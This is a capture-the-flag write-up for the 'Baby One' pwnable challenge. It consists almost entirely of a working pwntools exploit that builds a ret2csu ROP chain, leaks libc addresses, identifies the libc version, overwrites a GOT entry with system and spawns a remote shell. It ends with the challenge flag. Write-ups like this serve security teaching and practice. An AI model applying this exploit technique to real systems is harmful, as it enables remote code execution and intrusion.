# **Baby One**

#### tag : pwnable, rop, libc-database

-----------------------------------------------

#### Description

>Can you prove you are not a baby anymore ?
>
>service is running at : nc 51.254.114.246 1111
>
>Author : Anis_Boss

-----------------------------------------------

#### Solution

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

r = remote('51.254.114.246', 1111)

main = 0x4005f6
write_plt = 0x4004b0
write_got = 0x601018
read_plt = 0x4004c0
read_got = 0x601020
bss = 0x601051

# libc_csu_init gadget
def gg(rdx, rsi, edi, f):
	p = flat(
		0x4006bb, 	# _libc_csu_init
		0x1,		# rbp
		f,			# r12
		rdx,		# r13
		rsi,		# r14
		edi,		# r15
		0x4006a0	# _libc_csu_init
	)
	p += p64(0x0) * 7
	return p

# stage 0 : # leak server-side libc function address
'''
r.recvuntil('\n')
r.send('a' * 0x38 + gg(8, write_got, 1, write_got) + gg(8, read_got, 1, write_got))

libc_write = u64(r.recv(8))
libc_read = u64(r.recv(8))
log.info('leak libc_write : 0x%x' % libc_write)
log.info('leak libc_read : 0x%x' % libc_read)
'''
# server-side response
# [*] leak libc_write : 0x7fac12ddb2b0
# [*] leak libc_read : 0x7fac12ddb250

# server-side libc version
'''
$ ./find write 2b0 read 250
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
$ ./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
  -> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
  -> Downloading package
  -> Extracting package
  -> Package saved to libs/libc6_2.23-0ubuntu10_amd64
'''

# server-side libc function offset
libc_write_offset = 0xf72b0
libc_system_offset = 0x45390

# stage 1 : leak libc address and wrtie "/bin/sh" to bss
r.recvuntil('\n')
r.send('a' * 0x38 + gg(8, write_got, 1, write_got) + gg(8, bss, 0, read_got) + p64(main))
libc_base = u64(r.recv(8)) - libc_write_offset
libc_system = libc_base + libc_system_offset
r.send('/bin/sh\x00')

log.info('leak libc_base : 0x%x' % libc_base)
log.info('leak libc_system : 0x%x' % libc_system)

# stage 2 : wrtie write_got to sytsem and call
r.recvuntil('\n')
r.send('a' * 0x38 + gg(8, write_got, 0, read_got) + gg(0, 0, bss, write_got))
r.send(p64(libc_system))
r.interactive()
```
**securinets{controlling_rdx_for_the_win}**
